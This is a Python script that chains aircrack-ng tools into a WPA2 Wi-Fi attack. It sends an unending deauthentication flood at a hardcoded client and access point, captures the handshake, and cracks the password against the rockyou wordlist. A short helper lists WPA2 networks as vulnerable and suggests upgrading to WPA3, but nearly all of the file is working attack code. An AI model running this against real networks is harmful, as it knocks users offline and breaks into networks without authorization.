import subprocess, signal, sys, time, shutil, csv

deauth_process = None  # Global variable to keep track of the deauth subprocess

def dump(ap_mac, channel):
    global deauth_process
    try:
        print("Starting packet capture on AP with BSSID:", ap_mac)
        # Initiate packet capture
        subprocess.run(["sudo", "airodump-ng", "wlan0mon", "--bssid", ap_mac, "-c", str(channel), "-w", "/mnt/data/wpa_attack"])
    except Exception as e:
        print("Failed to start dump:", e)
    finally:
        if deauth_process:
            deauth_process.terminate()  # Terminate deauth process when dump is done or fails

def deauth(ap_mac, c_mac, interface):
    try:
        print("Starting deauthentication attack on client with MAC:", c_mac)
        # Start the deauth process in the background
        global deauth_process
        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, interface])
    except Exception as e:
        print("Failed to start deauth:", e)

def crack():
    try:
        print("Attempting to crack WPA password...")
        subprocess.run(["sudo", "aircrack-ng", "/mnt/data/wpa_attack-01.cap", "-w", "/usr/share/wordlists/rockyou.txt"])
    except Exception as e:
        print("Failed to start crack:", e)

def signal_handler(sig, frame):
    global deauth_process
    if deauth_process:
        deauth_process.terminate()  # Ensure deauth process is terminated on Ctrl+C
    print('Operation canceled by user.')
    sys.exit(0)

def move_cap_file():
    try:
        shutil.move("./wpa_attack-01.cap", "/mnt/data/wpa_attack-01.cap")
        print(".cap file moved to /mnt/data/")
    except Exception as e:
        print("Failed to move .cap file:", e)

def identify_wpa2():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]:  # Assuming the encryption standard is in the second column
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Note: Uses WPA2 encryption. While more secure than WEP, it's still less secure compared to WPA3.")
                    print("Remediation: Upgrade to WPA3 encryption for enhanced security.\n")
            else:
                print("No vulnerable access points found using WPA2 encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def identify_clients():
    pass

def main():
    ap_mac = "18:1B:EB:FC:B0:74"
    channel = "6"  # Channel should be a string as it's passed directly to subprocess commands
    interface = "wlan0mon"
    c_mac = "10:F6:0A:7A:8C:94"  # Example client MAC address; replace with actual target
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start deauth attack in the background
    deauth(ap_mac, c_mac, interface)
    
    print("Collecting packets, press Ctrl+C to stop...")
    try:
        dump(ap_mac, channel)
    except KeyboardInterrupt:
        move_cap_file()
        user_decision = input("\nPacket capture interrupted. Do you want to attempt to crack the WPA password? (y/n): ")
        if user_decision.lower() == 'y':
            print("Proceeding to crack the WPA password...")
            crack()
        else:
            print("Operation aborted by the user.")

if __name__ == "__main__":
    main()
